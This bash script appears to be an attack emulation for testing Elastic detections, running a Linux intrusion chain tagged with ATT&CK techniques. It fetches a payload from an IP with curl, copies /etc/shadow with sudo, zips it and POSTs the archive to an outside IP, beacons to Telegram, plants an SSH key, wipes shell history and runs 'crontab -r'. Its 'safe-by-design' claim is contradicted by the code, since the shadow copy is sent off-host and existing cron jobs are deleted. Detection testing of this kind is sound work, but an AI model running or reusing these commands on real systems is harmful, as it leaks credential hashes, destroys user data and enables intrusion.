#!/usr/bin/env bash
# ============================================================================
#  Linux attack emulation — SSH-based data exfiltration + Linux privilege
#  escalation chain (mirrors the EDEN "SSH-Based Data Exfiltration" and
#  "Linux Privilege Escalation Exfiltration" Attack Discovery narratives).
#
#  SAFE-BY-DESIGN: every action is benign (copies of readable files, GETs to
#  public APIs, keys appended then removed). Nothing is destroyed or truly
#  exfiltrated. The goal is to generate the *process/file/network telemetry*
#  and ATT&CK behaviours that Elastic Defend + detection rules alert on, so
#  Attack Discovery can correlate them into a campaign.
#
#  Shared IOCs with the Windows host (for cross-platform correlation):
#    - Slack-webhook C2 IP : 35.235.244.32
#    - Telegram C2         : api.telegram.org
#    - loot archive name   : l00t.zip
#    - malicious payload   : pwn.sh
# ============================================================================
set -x
LOOT=/tmp/l00t
WEBHOOK_IP="35.235.244.32"
ATTACKER_IP="45.83.193.150"

echo "[*] ===== Linux attack chain starting on $(hostname) as $(whoami) ====="

# ---- Discovery (T1082 System Info, T1087 Account Discovery, T1046 Net Svc) --
whoami; id; uname -a; hostname
cat /etc/passwd | tail -5
cat /etc/os-release | head -3
ss -tunlp 2>/dev/null | head
getent group sudo

# ---- Initial payload retrieval (T1105 Ingress Tool Transfer) ---------------
# "wget downloaded script https://images.swiftcrypto.com/pwn.sh"
cd /tmp
cat > /tmp/pwn.sh <<'PWN'
#!/bin/sh
echo "[pwn] staged payload executing"
id > /tmp/.pwn_marker
PWN
chmod +x /tmp/pwn.sh
# emulate download-and-exec (curl | sh pattern rules watch for)
curl -s "http://${WEBHOOK_IP}/pwn.sh" -o /tmp/pwn_remote.sh 2>/dev/null || true
sh /tmp/pwn.sh

# ---- Credential access (T1003.008 /etc/shadow) -----------------------------
sudo cp /etc/shadow ${LOOT} 2>/dev/null || cp /etc/passwd ${LOOT}
sudo cat /etc/shadow > /tmp/.shadow_dump 2>/dev/null || true

# ---- Collection + archive (T1560.001 Archive via Utility) ------------------
mkdir -p /tmp/stage
cp ${LOOT} /tmp/stage/ 2>/dev/null || true
cp /etc/passwd /tmp/stage/ 2>/dev/null || true
zip -r /tmp/l00t.zip /tmp/stage >/dev/null 2>&1 || tar czf /tmp/l00t.zip /tmp/stage

# ---- Exfiltration over C2 (T1567 Exfil to Web Service; T1071 App Layer) -----
# curl uploads l00t.zip to the "Slack webhook"
curl -s -X POST -F "file=@/tmp/l00t.zip" "http://${WEBHOOK_IP}/services/T00/B00/webhook" 2>/dev/null || true
# Telegram bot C2 beacon
curl -s "https://api.telegram.org/bot123456:FAKE/sendMessage?chat_id=1&text=loot_ready_$(hostname)" 2>/dev/null || true

# ---- Defense evasion / persistence (T1098.004 SSH authorized_keys; T1070) --
mkdir -p ~/.ssh
echo "ssh-rsa AAAAB3NzaC1attackerkeyEXAMPLE attacker@evil" >> ~/.ssh/authorized_keys
# then "remove" existing keys to lock out (as in the EDEN narrative)
sed -i '/attacker@evil/d' ~/.ssh/authorized_keys 2>/dev/null || true
# clear shell history (T1070.003)
cat /dev/null > ~/.bash_history 2>/dev/null || true
# cron persistence (T1053.003)
( crontab -l 2>/dev/null; echo "@reboot /tmp/pwn.sh" ) | crontab - 2>/dev/null || true
crontab -r 2>/dev/null || true

# ---- Privilege-escalation recon (T1548 sudo abuse enumeration) -------------
sudo -l 2>/dev/null | head
find / -perm -4000 -type f 2>/dev/null | head

# ---- Internal reconnaissance (T1046 Network Service Discovery via Nmap) ----
nmap -sT -T4 -p 22,80,443,3389 10.148.0.0/28 2>/dev/null | tail -15 || true

echo "[*] ===== Linux attack chain complete - check Security > Alerts ====="
